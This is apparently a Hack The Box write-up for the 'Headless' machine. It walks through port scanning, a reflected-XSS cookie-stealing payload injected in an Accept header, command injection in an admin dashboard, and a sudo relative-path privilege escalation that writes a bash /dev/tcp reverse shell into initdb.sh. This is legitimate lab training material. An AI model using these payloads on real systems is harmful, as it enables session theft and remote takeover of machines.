# HTB – Headless
### TL;DR
This is an OSCP-like Debian 12 machine running a web site vulnerable to reflected-XSS. We steal an admin cookie exploiting this vulnerability that permits us to get access to an administration dashboard. Here, a command injection vulnerability is exploited to get an user shell. Regarding escalation, we find a relative path vulnerability affecting a `sudo` binary.
### KEYWORDS
Reflected-XSS, command injection, `sudo` escalation, relative path vulnerability.
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-23 15:13 EDT
Nmap scan report for 10.10.11.8
Host is up, received user-set (0.14s latency).
Not shown: 40603 closed tcp ports (conn-refused), 24930 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,5000 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-23 15:18 EDT
Nmap scan report for 10.10.11.8
Host is up, received user-set (0.11s latency).
Scanned at 2024-03-23 15:18:23 EDT for 90s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 900294283dab2274df0ea3b20f2bc617 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2eb90824021b609460b384a99e1a60ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 23 Mar 2024 19:18:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=3/23%Time=65FF2B06%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Sat,\x2023\x20Mar\x202024\x2019:18:56\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:02799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;
SF:\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construction
SF:</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20
SF:'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displ
SF:ay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-c
SF:ontent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ali
SF:gn-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h
SF:eight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200,\
SF:x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE\x
SF:20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\
SF:x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respons
SF:e</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version
SF:\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20u
SF:nsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 90.75 seconds
```
Fuzz for hidden folders.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -fc 404 -u http://$target:5000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.8:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 288ms]
support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 187ms]
:: Progress: [4713/4713] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```
### USER
Browse the site with firefox, in the `/support` URI we can inject a payload.

![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/55606cbb-6df7-48e7-9c34-2f8e67378913)

A hacking protection alert is triggered, the application replies with info taken from the user HTTP request headers. This means the application is a candidate for a reflected-XSS vulnerability.

![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/62b975de-98a6-4040-acba-c23cd1b05795)

Capture an HTTP request and send to Repeater, then inject a cookie-stealing payload in any on the reflected headers such as "User-Agent", "Accept", etc. (in this case we will use the "Accept" header).
```markdown
<img src=hey onerror='eval(atob("ZmV0Y2go[...]9va2llKTs="));'></img>
```

![Untitled9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/81b9d48a-66a9-4258-a741-fca22f84e0bd)

An `is_admin` cookie is received on a built-in PHP server under our control.

![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c60c6bb1-8c54-427b-bdcf-8f2de347ee49)

Add the cookie to Firefox (or Burpsuite headers) and navigate to `/dashboard`, an administrator panel appears.

![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9c4fbbc9-a6fe-477c-bf80-e47ae2bf2c8b)

Turns out the dashboard is used to execute a system diagnostic command. This looks like a candidate for command injection. Capture a request and add a reverse shell.

![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4733b253-e528-482b-a5a7-4c4e17f4c770)

A reverse shell for user `dvir` is received on port 1919.

![Untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/53854ac0-42fa-479c-825a-077d4d14a7a8)

Which can be used to retrieve the user flag.
### ROOT
From the low-priv shell, take the opportunity to enumerate the system.
```markdown
> uname -a && cat /etc/os-release 
Linux headless 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
And the `sudo` configuration.
```markdown
> sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
Enumerate the `syscheck` binary.
```markdown
> strings /usr/bin/syscheck
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  exit 1
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
exit 0
dvir@headless:~$ 
```
There is a vulnerability in this code: in the execution of the `./initdb.sh` script the path is not fully defined. This means we can create our own script in a directory with write permissions (for example, our home directory) then run `sudo /usr/bin/syscheck` from there. This will make the script to be run as root.<br>
<br>
Create a script in the home directory `/home/dvir/initdb.sh` and add a reverse shell in the code.
```markdown
> echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.xxx.xxx/9000 0>&1"' >> /home/dvir/initdb.sh
```
Update script permissions.
```markdown
> chmod +x initdb.sh
```
And run as root, from the directory `/home/dvir`
```markdown
> sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  1.86, 1.23, 0.55
Database service is not running. Starting it...
```
A reverse shell is received on port 9000.

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/2fdc0ba7-322f-41cf-a4af-592fe4d503a1)

You are root.
